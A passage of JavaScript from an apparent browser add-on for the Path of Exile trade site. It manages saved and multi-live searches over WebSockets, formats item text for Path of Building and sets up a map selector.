    debug(`Retrying to load saved searches. Search list appear to be empty even if there are searches to show.`);
    loadMultiSearches(true);
  }
};

var loadSearches = function(retryed) {
  //TODO: text for no results
  //TODO: filter list by other meta data
  //TODO: tooltip significant search params
  loadFrame.contents().find('#search-list').empty();

  var searches = getSearches();
  var searchProperties = getSearchProperties();
  var colorsImage = new Image();
  colorsImage.crossOrigin = "Anonymous";
  colorsImage.src = "https://raw.githubusercontent.com/ghostscript3r/poe-trade-enhancer/master/images/text-color.png";

  $.each( Object.keys(searches).sort(), function( i, k ) {
    debug(`loading search ${i} - ${k}`);
    var row = $(`<tr></tr>`);
    row.data("name", k);
    row.data("params", deserialize(searches[k]));

    var lnk = $(`<a href="#" onclick="return false;">${k}</a>`);
    lnk.on( "click", function(e) {
      openSearch(searches[k], e.ctrlKey, null, getSearchAdditions(loadFrame));
    });
    row.append(lnk);
    lnk.wrap('<td>');

    var ren = $(`<a href="#" onclick="return false;" title="rename"><i class="fas fa-edit"></i></a>`);
    ren.on( "click", function(e) {
      $("#renameName", loadFrame[0].contentWindow.document).val(k);
      $("#renameButton", loadFrame[0].contentWindow.document).one('click', function() {
        renameSearch(k, $("#renameName", loadFrame[0].contentWindow.document).val());
        $("#renameModal", loadFrame[0].contentWindow.document).modal('hide');
      });
      $("#renameModal", loadFrame[0].contentWindow.document).modal('show');
    });
    row.append(ren);
    ren.wrap('<td>');

    var cpic = $(getColorPickerTemplate());
    row.append(cpic);
    cpic.wrap('<td>');
    cpic.tinycolorpicker({image: colorsImage, color: ((searchProperties[k] && searchProperties[k].color) ? searchProperties[k].color : null)});
    cpic.on( "change", function(e, colorHex, colorRGB) {
      debug(arguments);
      colorSearch(k, colorHex);
    });

    var del = $(`<a href="#" onclick="return false;" title="delete"><i class="fas fa-trash"></i></a>`);
    del.on( "click", function(e) {
      deleteSearch(k);
      row.remove();
    });
    row.append(del);
    del.wrap('<td>');

    loadFrame.contents().find('#search-list').append(row);
  });
  setupSearchAdditions(loadFrame);
  if (!retryed && Object.keys(searches).length > 0 && loadFrame.contents().find('#search-list tr').length === 0) {
    debug(`Retrying to load saved searches. Search list appear to be empty even if there are searches to show.`);
    loadSearches(true);
  }

};

var multiFrameContent = /* html */ `
<div class="container fixed-top">
  <div class="row">
    <form class="col-md-12 py-2 mb-0">
      <h5>Multi live search</h5>
      <div class="input-group">
        <input type="text" class="form-control border-primary" name="searchName" id="searchName" placeholder="Filter list..." autocomplete="off" />
        <div class="input-group-append">
          <span class="input-group-text" id="basic-addon2"><i class="fas fa-filter"></i></span>
        </div>
      </div>
    </form>
  </div>
</div>
<div class="container middle-list">
  <div class="row">
    <div class="col">
      <button id="check-all" class="btn btn-xs" type="button" name="button" tippy="Select all"><i class="far fa-check-square"></i> all</button>
      <button id="check-none" class="btn btn-xs" type="button" name="button" tippy="Deselect all"><i class="far fa-square"></i> none</button>
    </div>
    <div class="col-5" id="search-additions-force-cost">
    </div>
    <div class="col" id="search-additions-force-league">
    </div>
  </div>
  <div class="row pb-5">
    <div class="col-md-12 table-responsive">
      <div class="alert alert-warning d-none" role="alert" id="no-searches-alert">
        You need to save at least one search to use this feature
      </div>
      <table class="table table-sm" id="search-list">
      </table>
    </div>
  </div>
</div>
<div class="container fixed-bottom py-2 border-top">
  <div class="row justify-content-end">
    <div class="col-4 col-md-3">
      <button id="multi-live" type="button" class="btn btn-primary">
        Search <i class="fas fa-satellite-dish"></i>
      </button>
    </div>
    <div class="col-2">
      <button id="" type="button" class="btn btn-close">
        Close
      </button>
    </div>
  </div>
</div>
`;

var loadFrameContent = /* html */ `
<div class="modal fade" id="renameModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="exampleModalLabel">Rename search</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <input type="text" class="form-control border-primary" name="renameName" id="renameName" autocomplete="off" />
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" id="renameButton" class="btn btn-primary">Rename</button>
      </div>
    </div>
  </div>
</div>
<div class="modal fade" id="importModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
  <div class="modal-dialog" role="document">
    <div class="modal-content">
      <div class="modal-header">
        <h5 class="modal-title" id="importModalLabel">Import saved searches</h5>
        <button type="button" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body">
        <form>
          <div class="form-group">
            <label for="importText">Paste text here</label>
            <textarea class="form-control" id="importText" rows="3"></textarea>
          </div>
          <div class="form-group">
            <div class="custom-control custom-checkbox">
              <input type="checkbox" class="custom-control-input" id="importOverwrite" checked>
              <label class="custom-control-label" for="importOverwrite">Remove all current saved searches while importing</label>
            </div>
          </div>
        </form>
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-secondary" data-dismiss="modal">Close</button>
        <button type="button" id="doImportButton" class="btn btn-primary">Import</button>
      </div>
    </div>
  </div>
</div>
<div class="container fixed-top">
  <div class="row">
    <form class="col-md-12 pb-0">
      <h5>Load search</h5>
      <div class="input-group">
        <input type="text" class="form-control border-primary" name="searchName" id="searchName" placeholder="Filter list..." autocomplete="off" />
        <div class="input-group-append">
          <span class="input-group-text" id="basic-addon2"><i class="fas fa-filter"></i></span>
        </div>
      </div>
    </form>
  </div>
</div>
<div class="container middle-list">
  <div class="row px-1">
    <div class="col" id="search-additions-force-cost">
    </div>
    <div class="col" id="search-additions-force-league">
    </div>
  </div>
  <div class="row pb-5">
    <div class="col-md-12 table-responsive">
      <table class="table table-sm" id="search-list">
      </table>
    </div>
  </div>
</div>
<div class="container fixed-bottom py-2 border-top">
  <div class="row justify-content-end">
    <div class="col">
      <button id="import" type="button" class="btn btn-primary">
        Import <i class="fas fa-upload"></i>
      </button>
      <button id="export" type="button" class="btn btn-primary">
        Export <i class="fas fa-download"></i>
      </button>
    </div>
    <div class="col-2">
      <button id="" type="button" class="btn btn-close">
        Close
      </button>
    </div>
  </div>
</div>
`;

var saveFrameContent = /* html */ `
<div class="container">
  <div class="row">
    <form class="col-md-12 py-2">
      <h5>Save search</h5>
      <div class="input-group">
        <input type="text" class="form-control typeahead border-primary" name="searchName" id="searchName" placeholder="Search name..." autocomplete="off" />
        <div class="input-group-append">
          <button id="saveButton" type="button" class="btn btn-outline-primary">
            <i class="fas fa-save"></i>
          </button>
          <button id="" type="button" class="d-none btn btn-outline-primary btn-close">
            <i class="fas fa-window-close"></i>
          </button>
        </div>
      </div>
    </form>
  </div>
  <div class="row">
    <div class="col-md-12">
      <button id="" type="button" class="btn btn-close float-right">
        Close
      </button>
    </div>
  </div>
</div>
`;

var filterSearch = function(iframe) {
  $(iframe[0].contentWindow.document).keyup(function(e) {
    if(e.target && e.target.id == "searchName") {
      debug($(e.target).val());
      $("#search-list tr", iframe[0].contentWindow.document)
      .filter(function() {
        if ($(e.target).val() == "" || $(this).data('name').toLowerCase().indexOf($(e.target).val().toLowerCase()) >= 0) {
          $(this).removeClass("d-none");
        } else {
          $(this).addClass("d-none");
        }
      });
    }
  });
};

var addSearchAdditions = function(iframe) {
  var forceLeagueCheckbox = $(/* html */ `<div class="form-group form-check form-control-sm">
    <input type="checkbox" class="form-check-input" id="force-league">
    <label class="form-check-label" for="force-league">Force <span class="current-league"></span> league</label>
  </div>`);
  var forceMaxCostCheckbox = $(/* html */ `<div>
    <div class="nowrap">
      <label for="force-cost" class="col-form-label col-form-label-sm">force max chaos cost</label>
      <input type="number" class="form-control form-control-sm col-3 d-inline" id="force-cost">
    </div>
    <div class="form-group form-check form-control-sm">
      <input type="checkbox" class="form-check-input" id="force-cost-no-override">
      <label class="form-check-label" for="force-cost-no-override">only if not specified in search</label>
    </div>
  </div>`);
  iframe.contents().find("#search-additions-force-league").empty().append(forceLeagueCheckbox);
  iframe.contents().find("#search-additions-force-cost").empty().append(forceMaxCostCheckbox);
  iframe.contents().find("#force-league").on("click change", function () {
    setSetting(iframe.attr("id")+"-last-force-league", iframe.contents().find("#force-league").is(':checked'));
  });
  iframe.contents().find("#force-cost-no-override").on("click change", function () {
    setSetting(iframe.attr("id")+"-last-force-cost-no-override", iframe.contents().find("#force-cost-no-override").is(':checked'));
  });
  iframe.contents().find("#force-cost").on("click change", function () {
    setSetting(iframe.attr("id")+"-last-force-cost", iframe.contents().find("#force-cost").val());
  });
};

var setupSearchAdditions = function(iframe) {
  var lg = getCurrentLeague();
  if (lg) {
    var lastForceLeague = getSetting(iframe.attr("id")+"-last-force-league");
    iframe.contents().find("#search-additions-force-league .current-league").text(lg);
    iframe.contents().find("#force-league").prop("checked", ""+lastForceLeague == "true").prop("disabled", false);
  } else {
    iframe.contents().find("#search-additions-force-league .current-league").text("");
    iframe.contents().find("#force-league").prop("checked", false).prop("disabled", true);
  }
  var lastForceCost = getSetting(iframe.attr("id")+"-last-force-cost");
  var lastForceCostNoOverride = getSetting(iframe.attr("id")+"-last-force-cost-no-override");
  iframe.contents().find("#force-cost-no-override").prop("checked", ""+lastForceCostNoOverride == "true");
  iframe.contents().find("#force-cost").val(lastForceCost);
};

var getSearchAdditions = function(iframe) {
  var options = {};
  options["force-cost-no-override"] = iframe.contents().find("#force-cost-no-override").is(':checked');
  options["force-league"] = (iframe.contents().find("#force-league").is(':checked') ? getCurrentLeague() : false);
  options["force-cost"] = iframe.contents().find("#force-cost").val();
  return options;
};

var sockets = [], msConsole, msConsoleIntervalId, msConsoleStopped;

var setupMultiSearchConsole = function(holder, names, noplay) {
  msConsoleStopped = false;
  sockets = [];
  msConsole = $(/* html */ `
    <span id="ms-console"><span id="sockets-status">starting...</span> - <span id="working-sockets">0</span> of ${names.length} WebSockets working - <a id="sockets-start-all" class="hide"><i class="fas fa-play"></i> restart</a><a id="sockets-stop-all" class="hide"><i class="fas fa-stop"></i> stop</a> <span id="ms-console-tip-wrapper" class="hide"></span></span>
  `);
  holder.empty().append(msConsole);
  var tip = $(/* html */ `
    <div id="ms-console-tip"></div>
  `);
  $('#ms-console-tip-wrapper').append(tip);
  $.each( names, function( i, name ) {
    sockets.push({name: name, status: "initialized"});
    $("#ms-console-tip").append(/* html */ `
      <span id="ms-console-tip-${i}"><b>${name}</b> - <span id="ms-console-tip-status-${i}">initialized</span>&nbsp;&nbsp;&nbsp;<span id="ms-console-tip-last-${i}" class="gs-quote"></span></span><br />
    `);
    // var starter = $(/* html */ `<a class="ms-console-tip-start-${i} hide"><i class="fas fa-play"></i> restart</a>`);
    // starter.on("click", function () {
    //   startSocket(i, sockets[i].resource);
    // });
    // var stopper = $(/* html */ `<a class="ms-console-tip-stop-${i}"><i class="fas fa-stop"></i> stop</a>`);
    // stopper.on("click", function () {
    //   stopSocket(i);
    // });
    //$(`#ms-console-tip-${i}`).prepend(stopper).prepend(starter);
  });
  tippy(msConsole[0], {
    content: "",
    // trigger: 'manual',
    // showOnInit: true,
    interactive: true
  });
  msConsole[0]._tippy.setContent($('#ms-console-tip-wrapper').html());
  if (!noplay) {
    $('#sockets-stop-all').removeClass("hide");
    $('#sockets-stop-all').on("click", function () {
      $('#sockets-stop-all,#sockets-start-all').toggleClass("hide");
      msConsoleStopped = true;
      stopAllSockets();
    });
    $('#sockets-start-all').on("click", function () {
      $('#sockets-stop-all,#sockets-start-all').toggleClass("hide");
      var resources = sockets.map(function (x) {
        return x.resource;
      });
      msConsoleStopped = false;
      startAllSockets(resources);
    });
  }
};

var startLiveConsole = function() {
  msConsoleIntervalId = setInterval(updateSocketStatus, 3000);
};

var stopLiveConsole = function() {
  clearInterval(msConsoleIntervalId);
};

var fetchedSocket = function(index, res) {
  sockets[index].resource = res;
  sockets[index].status = ((res) ? "fetched" : "failed");
  sockets[index].doing = "fetching";
  updateSocketStatus();
};

var socketStatus = function(index, status, doing) {
  debug("Changing socket status:", index, status, sockets[index]);
  sockets[index].lastWasAPing = (status == "pinged");
  sockets[index].status = (status == "pinged") ? "working" : status;
  sockets[index].doing = doing;
  if (sockets[index].status == "working" ) {
    sockets[index].lastMessage = moment().valueOf();
    sockets[index].retry = null;
  } else if (status == "stopped" && !msConsoleStopped) {
    if (!sockets[index].retry) {
      sockets[index].retry = 10;
    } else {
      sockets[index].retry = Math.min(sockets[index].retry + 10, 120);
    }
    sockets[index].retry = Math.round(randomize(sockets[index].retry));
    sockets[index].retryId = setTimeout(function(){
      debug("WS - Retry connecting ["+index+"]: "+sockets[index].resource, sockets[index].name, sockets[index].retry);
      startSocket(index, sockets[index].resource);
    }, sockets[index].retry * 1000);
  }
  updateSocketStatus();
};

var updateSocketStatus = function() {
  $.each( sockets, function( i, s ) {
    $(`#ms-console-tip-status-${i}`).text(s.status);
    $(`#ms-console-tip-last-${i}`).text("");
    $(`#ms-console-tip-start-${i}`).toggleClass("hide", s.status != "stopped");
    $(`#ms-console-tip-stop-${i}`).toggleClass("hide", s.status == "stopped");
    switch (s.status) {
      case "stopped":
        $(`#ms-console-tip-${i}`).removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-danger");
        if (sockets[i].retry && !msConsoleStopped) {
          $(`#ms-console-tip-last-${i}`).text(`Reconnecting in ${sockets[i].retry} seconds`);
        }
        if (sockets[i].retryId && msConsoleStopped) {
          clearTimeout(sockets[i].retryId);
        }
        break;
      case "failed":
        $(`#ms-console-tip-${i}`).removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-danger");
        if (sockets[i].doing) {
          $(`#ms-console-tip-last-${i}`).text(`${sockets[i].doing}`);
        }
        break;
      case "fetched":
      case "connected":
        $(`#ms-console-tip-${i}`).removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-info");
        break;
      case "working":
        var lastMsg = moment(s.lastMessage || 0);
        if (!s.lastMessage) {
          $(`#ms-console-tip-last-${i}`).text("never received data from server");
        } else if (moment.duration(moment().diff(lastMsg)).asMinutes() > 1) {
          $(`#ms-console-tip-${i}`).removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-warning");
          $(`#ms-console-tip-last-${i}`).text((s.lastWasAPing ? "last ping " : "last message ")+"older then 1 minute");
        } else {
          $(`#ms-console-tip-${i}`).removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-success");
          $(`#ms-console-tip-last-${i}`).text((s.lastWasAPing ? "pinged " : "last message ")+moment.duration(moment().diff(lastMsg)).seconds()+" seconds ago");
        }
        break;
    }
  });
  var failed = sockets.filter(function (x) {
    return x.status == "failed";
  });
  var stopped = sockets.filter(function (x) {
    return x.status == "stopped";
  });
  var fetched = sockets.filter(function (x) {
    return x.status == "fetched";
  });
  var connected = sockets.filter(function (x) {
    return x.status == "connected";
  });
  var working = sockets.filter(function (x) {
    return x.status == "working";
  });
  var workingOrConnected = sockets.filter(function (x) {
    return x.status == "working" || x.status == "connected";
  });
  if (failed.length == sockets.length) {
    $(`#sockets-status`).text("failed").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-danger");
  } else if (failed.length > 0) {
    $(`#sockets-status`).text("some failed").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-warning");
  } else if (stopped.length == sockets.length) {
    $(`#sockets-status`).text("stopped").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-danger");
  } else if (stopped.length > 0) {
    $(`#sockets-status`).text("some stopped").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-warning");
  } else if (workingOrConnected.length == sockets.length) {
    $(`#sockets-status`).text("working").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-success");
  } else if (connected.length == sockets.length) {
    $(`#sockets-status`).text("connected").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-success");
  } else if (fetched.length == sockets.length) {
    $(`#sockets-status`).text("searches fetched").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-info");
  } else if (fetched.length > 0) {
    $(`#sockets-status`).text("fetching searches").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-info");
  } else if (connected.length > 0) {
    $(`#sockets-status`).text("connecting").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-info");
  } else if (working.length > 0) {
    $(`#sockets-status`).text("connecting").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-info");
  } else {
    $(`#sockets-status`).text("initialized").removeClass("gs-danger gs-info gs-warning gs-success").addClass("gs-info");
  }
  msConsole[0]._tippy.setContent($('#ms-console-tip-wrapper').html());
  $('#working-sockets').text(workingOrConnected.length);

};

var createMultiFrame = function(iframe, callback) {
  multiFrame = iframe;

  iframe.contents().find('.btn-close').on('click', function() {
    closeFrame("multi-frame")
  });

  iframe.contents().find('#multi-live').on('click', function() {
    var searches = getSearches();
    var multiSearches = [], names = [];
    $("#search-list tr:has(.form-check-input:checked)", iframe[0].contentWindow.document).each(function( index ) {
      var dt = $(this).data();
      multiSearches.push(searches[dt.name]);
      names.push(dt.name);
    });
    setSetting("last-multiLive", names);
    openMultiSearch(multiSearches, names, true, getSearchAdditions(multiFrame));
  });

  filterSearch(iframe);
  addSearchAdditions(iframe);

  iframe.contents().find('#check-all').on('click', function() {
    $("#search-list .form-check-input:visible", iframe[0].contentWindow.document).prop('checked', true);
    checkMultiSelected();
  });
  iframe.contents().find('#check-none').on('click', function() {
    $("#search-list .form-check-input:visible", iframe[0].contentWindow.document).prop('checked', false);
    checkMultiSelected();
  });

  if (callback) callback();
};

var createLoadFrame = function(iframe, callback) {
  // setTimeout(function(){
  // iframe.on('load',function(){
    loadFrame = iframe;

    iframe.contents().find('.btn-close').on('click', function() {
      closeFrame("load-frame")
    });
    debug("iframe.contents().find('.btn-close')", $(".btn-close", iframe[0].contentWindow.document));
    iframe.contents().find('#export').on('click', function() {
      download("poetrade-searches.txt", localStorage.getItem(getSearchKey()));
    });

    iframe.contents().find('#import').on('click', function() {
      $("#doImportButton", iframe[0].contentWindow.document).one('click', function() {
        importSearch($("#importText", iframe[0].contentWindow.document).val(), $("#importOverwrite", iframe[0].contentWindow.document).is(":checked"));
        debug($("#importOverwrite", iframe[0].contentWindow.document));
        $("#importModal", iframe[0].contentWindow.document).modal('hide');
      });
      $("#importModal", iframe[0].contentWindow.document).modal('show');
    });

    // $("#renameModal", iframe[0].contentWindow.document).modal({show: false});
    iframe.contents().find("#renameModal").modal({show: false});
    filterSearch(iframe);
    addSearchAdditions(iframe);
    // $("#searchName", iframe[0].contentWindow.document).on("change", function() {
    // });

    if (callback) callback();
  // }, 5000);
};

var createSaveFrame = function(iframe, callback) {
  // setTimeout(function(){
  // iframe.on('load',function(){
    saveFrame = iframe;

    iframe.contents().find('.btn-close').on('click', function() {
      closeFrame("save-frame")
    });
    iframe.contents().find('#saveButton').on('click', saveSearch);

    $(iframe[0].contentWindow.document).keydown(function(e) {
      if(e.which == 13 && e.target && e.target.id == "searchName") {
        e.preventDefault();
        if ($("#searchName + ul.typeahead.dropdown-menu .dropdown-item.active", saveFrame[0].contentWindow.document).length == 0
          || !$("#searchName + ul.typeahead.dropdown-menu", saveFrame[0].contentWindow.document).first().is(":visible")) {
            saveSearch();
        }
      }
    });

    if (callback) callback();
  // }, 100);
};

var initSaveManager = function() {
  if (!saveManagerInitialized ) {
    saveManagerInitialized = true;
    [saveIcon, loadIcon, multiIcon] = getSaveIcons();

    addIframe({id:"load-frame", frameTemplate: frameTemplate, contents: loadFrameContent, trigger: ".gs-load", builder: createLoadFrame, onOpen: loadSearches}, function() {});
    addIframe({id:"save-frame", frameTemplate: frameTemplate, contents: saveFrameContent, trigger: ".gs-save", builder: createSaveFrame, onOpen: loadTypeaheadSearches}, function() {});
    addIframe({id:"multi-frame", frameTemplate: frameTemplate, contents: multiFrameContent, trigger: ".gs-multi", builder: createMultiFrame, onOpen: loadMultiSearches}, function() {});

  }
};

  function addCopyForPoB(item) {
  var name = item.data("name");
  var itemProps = {name: name, implicits:[], explicits:[]};
  var tier, maxTier;
  [tier, maxTier] = getTier(name);

  if (item.find(".title.itemframe0").length > 0) itemProps.rarity = "Normal";
  if (item.find(".title.itemframe1").length > 0) itemProps.rarity = "Magic";
  if (item.find(".title.itemframe2").length > 0) itemProps.rarity = "Rare";
  if (item.find(".title.itemframe3").length > 0) itemProps.rarity = "Unique";
  if (item.find(".title.itemframe4").length > 0) itemProps.rarity = "Normal";

  var nameForBaseItemSearch = name.replace(/\sof(\sthe)?\s\w+$/,"");
  debug(`${name} => ${nameForBaseItemSearch}`);
  var typeKey = endsWithOneOf(nameForBaseItemSearch, Object.keys(ITEM_TYPES));
  if (typeKey) {
    var baseItem = endsWithOneOf(nameForBaseItemSearch, ITEM_TYPES[typeKey]);
    if (baseItem) {
      itemProps.baseItem = baseItem;
      if (itemProps.rarity == "Rare") itemProps.name = itemProps.name.replace(new RegExp("\\s"+baseItem+"$"), "");
    }
  }

  if (!itemProps.baseItem && tier) {
    itemProps.baseItem = name;
  }

  var mapper = [
    {
      name: "requirements",
      properties: [
        {
          name: "Level",
          selector: "ul.requirements.proplist li:contains('Level:')",
          regexp: /Level:[^\d]*(\d+)/
        },
        {
          name: "Strength",
          selector: "ul.requirements.proplist li:contains('Strength:')",
          regexp: /Strength:[^\d]*(\d+)/
        },
        {
          name: "Intelligence",
          selector: "ul.requirements.proplist li:contains('Intelligence:')",
          regexp: /Intelligence:[^\d]*(\d+)/
        },
        {
          name: "Dexterity",
          selector: "ul.requirements.proplist li:contains('Dexterity:')",
          regexp: /Dexterity:[^\d]*(\d+)/
        },
        {
          name: "ItemLevel",
          selector: "ul.requirements.proplist li:contains('ilvl:')",
          regexp: /ilvl:[^\d]*(\d+)/
        }
      ]
    },
    {
      name: "stats",
      properties: [
        {
          name: "Quality",
          selector: "td.property[data-name='q']",
          regexp: /[^\d]*([\d\+\.]+)[^\d]*/
        },
        {
          name: "Armour",
          selector: "td.property[data-name='quality_armour']",
          regexp: /[^\d]*([\d\+\.]+)[^\d]*/
        },
        {
          name: "Evasion Rating",
          selector: "td.property[data-name='quality_evasion']",
          regexp: /[^\d]*([\d\+\.]+)[^\d]*/
        },
        {
          name: "Energy Shield",
          selector: "td.property[data-name='quality_shield']",
          regexp: /[^\d]*([\d\+\.]+)[^\d]*/
        },
        {
          name: "Chance to Block",
          selector: "td.property[data-name='block']",
          regexp: /[^\d]*([\d\+\.]+)[^\d]*/
        },
        {
          name: "Physical Damage",
          selector: "td.property[data-name='quality_pd']",
          regexp: /[^\d]*([\d\+\.\-]+)[^\d]*/
        },
        {
          name: "Critical Strike Chance",
          selector: "td.property[data-name='crit']",
          regexp: /[^\d]*([\d\+\.]+)[^\d]*/
        },
        {
          name: "Attacks per Second",
          selector: "td.property[data-name='aps']",
          regexp: /[^\d]*([\d\+\.]+)[^\d]*/
        },
      ]
    }
  ];
  for (var i = 0; i < mapper.length; i++) {
    var catMap = mapper[i];
    if (!itemProps[catMap.name]) {
      itemProps[catMap.name] = {};
    }
    for (var j = 0; j < catMap.properties.length; j++) {
      var props = catMap.properties[j];
      var el = item.find(props.selector);
      if (el.length > 0) {
        var match = props.regexp.exec(el.first().text());
        if (match && match.length > 0) {
          itemProps[catMap.name][props.name] = match[1];
        }
      }
    }
  }

  if (itemProps.stats.Quality && itemProps.stats.Quality.indexOf("+") >= 0) {
    itemProps.stats.Quality = "20";
  }
  if (itemProps.requirements.ItemLevel) {
    itemProps.ilvl = itemProps.requirements.ItemLevel;
    delete itemProps.requirements.ItemLevel;
  }

  item.find("ul.item-mods ul.mods.withline li").each(function( index ) {
    itemProps.implicits.push($( this ).text());
  });

  item.find("ul.item-mods ul.mods:not(.withline) li:not(.pseudo)").each(function( index ) {
    var clone = $( this ).clone();
    clone.find(".item-affix").remove();
    itemProps.explicits.push(_.trim(clone.text()));
  });

  item.find(".sockets-inner .socket,.sockets-inner .socketLink").each(function( index ) {
    if (!itemProps.sockets) {
      itemProps.sockets = "";
    }
    if ($( this ).hasClass("socket")) {
      if (itemProps.sockets != "" && !_.endsWith(itemProps.sockets, "-")) {
        itemProps.sockets += " ";
      }
    }
    if ($( this ).hasClass("socketI")) {
      itemProps.sockets += "B";
    }
    if ($( this ).hasClass("socketD")) {
      itemProps.sockets += "G";
    }
    if ($( this ).hasClass("socketS")) {
      itemProps.sockets += "R";
    }
    if ($( this ).hasClass("socketLink")) {
      itemProps.sockets += "-";
    }
  });

  if (item.find("td.item-cell h5 .corrupted").length > 0) itemProps.corrupted = true;
  debug(itemProps);
  var txt = [], separator = "--------", shortText = [];
  shortText.push(itemProps.name);
  if (itemProps.rarity) {
    txt.push("Rarity: "+itemProps.rarity);
    if (itemProps.rarity != "Normal") {
      shortText.push(itemProps.rarity);
    }
  }
  txt.push(itemProps.name);
  if (itemProps.baseItem) txt.push(itemProps.baseItem);
  txt.push(separator);
  if (Object.keys(itemProps.stats).length > 0) {
    $.each( itemProps.stats, function( key, value ) {
      txt.push( key + ": " + value + ((key.match(/(Chance|Quality)/g))?"%":""));
    });
    txt.push(separator);
  }
  if (Object.keys(itemProps.requirements).length > 0) {
    txt.push( "Requirements:" );
    $.each( itemProps.requirements, function( key, value ) {
      txt.push( key + ": " + value );
    });
    txt.push(separator);
  }
  if (itemProps.sockets) {
    txt.push("Sockets:" + itemProps.sockets);
    txt.push(separator);
  }
  if (itemProps.ilvl) {
    txt.push("Item Level:" + itemProps.ilvl);
    txt.push(separator);
    shortText.push("ilvl: "+itemProps.ilvl);
  }
  if (itemProps.implicits.length > 0) {
    $.each( itemProps.implicits, function( i, value ) {
      txt.push( value );
    });
    txt.push(separator);
  }
  if (itemProps.explicits.length > 0) {
    $.each( itemProps.explicits, function( i, value ) {
      if (i == 0 && _.startsWith(value, "enchanted ")) {
        txt.push( value.replace("enchanted ", "{crafted}") );
        txt.push( separator );
        shortText.push("Crafted");
      } else {
        txt.push( value.replace(/^crafted/,"{crafted}") );
      }
    });
    if (itemProps.corrupted) {
      txt.push("Corrupted");
      shortText.push("Corrupted");
    }
    txt.push(separator);
  }
  item.data("text", txt.join("\n"));
  item.data("shortText", shortText.join(" - "));
  debug(txt.join("\n"));
  var copyButton = $(`<a class="gs-style gs-save pob-clip-btn" data-tippy="Copy to clipboard" tabindex="0"><i class="fas fa-paste"></i></a>`);
  item.find("td.item-cell h5 .title:first").after(copyButton);

  debug(">>>>");
  debug(itemProps);
  debug(">>>>");
  if (itemProps.baseItem && item.find("td.item-cell h5 .wiki-link").length == 0) {
    item.find("td.item-cell h5 .found-time-ago").after(`<a target="_blank" class="wiki-link gs-style" href="http://pathofexile.gamepedia.com/${itemProps.baseItem}">[wiki]</a>`);
  } else if (itemProps.rarity == "Normal" && item.find("td.item-cell h5 .wiki-link").length == 0) {
    item.find("td.item-cell h5 .found-time-ago").after(`<a target="_blank" class="wiki-link gs-style" href="http://pathofexile.gamepedia.com/${itemProps.name}">[wiki]</a>`);
  }
}

  var mapSelectorInitialized = false;
var mapSearches = {}, mapOfMaps = {};
var defaultMapSearches = {tabs:{}};

var initMapSelector = function() {
  if (!mapSelectorInitialized && $('.filter-title > span:contains(Maps)').length > 0) {
    mapSelectorInitialized = true;
    var mapsIcon = $(`<span class="gs-style gs-fixTips gs-map-selector" data-tippy="Map selector"><i class="fas fa-globe-europe"></i></span>`);
    if ($('.filter-title > span:contains(Maps)').length > 0) {
      $('.filter-title > span:contains(Maps)').parent().append(mapsIcon);
      $('span.filter-title:contains(Items I Have)').parents('.search-advanced-pane').first().find(".gs-map-selector").addClass('gs-offer-map-selector').removeClass('gs-map-selector');

    } else {
      warn("Map Selector buttons not added to DOM");
    }
    addIframe({id:"map-selector-frame", frameTemplate: frameTemplate, contents: mapSelectorContent, trigger: ".gs-map-selector", builder: createMapSelectorFrame, onOpen: loadMapSearches}, function() {});
    addIframe({id:"offer-map-selector-frame", frameTemplate: frameTemplate, contents: mapSelectorContent, trigger: ".gs-offer-map-selector", builder: createMapSelectorFrame, onOpen: loadMapSearches}, function() {});
  } else if (!mapSelectorInitialized) {
    debug("WARNING: Map Selector not initiated");
  }
};

var createMapSelectorFrame = function(iframe, callback) {
  fixTabs(iframe, "#myTab", "#myTabContent");
  fixToggler(iframe, "#myTab", function(elem, event) { recalcMapSelector(iframe); });
  var regionsPanel = iframe.contents().find('#region').first();
  iframe.contents().find('.map-selector-control').on('change', function () {
    recalcMapSelector(iframe);
  });
  iframe.contents().find('.btn-reset').on('click', function () {
    resetMapSearches(iframe);
  });
  iframe.contents().find('.btn-ok').on('click', function () {
    applyMapSearches(iframe);
  });
  mapOfMaps = {regions: {}, maps: {}, mapTags: {}, pageMaps: {}, mapsList: []};
  var radioAll = $(/* html */ `<div class="row">
    <div class="col-4"><label class="btn"><i>all regions</i></label></div>
    <div class="col-8">
      <div class="btn-group btn-group-toggle" data-toggle="buttons">
        <label class="btn btn-link"><input type="radio" name="region-all-none" id="region-all-none" autocomplete="off"> none</label>
        <label class="btn btn-link"><input type="radio" name="region-all-any" id="region-all-any" autocomplete="off"> any</label>
        <label class="btn btn-link"><input type="radio" name="region-all-0" id="region-all-0" autocomplete="off"> 0 ws</label>
        <label class="btn btn-link"><input type="radio" name="region-all-1" id="region-all-1" autocomplete="off"> 1 ws</label>
        <label class="btn btn-link"><input type="radio" name="region-all-2" id="region-all-2" autocomplete="off"> 2 ws</label>
        <label class="btn btn-link"><input type="radio" name="region-all-3" id="region-all-3" autocomplete="off"> 3 ws</label>
        <label class="btn btn-link"><input type="radio" name="region-all-4" id="region-all-4" autocomplete="off"> 4 ws</label>
    </div>
  </div>`);
  regionsPanel.append(radioAll);
  $.each( REGIONS, function( i, r ) {
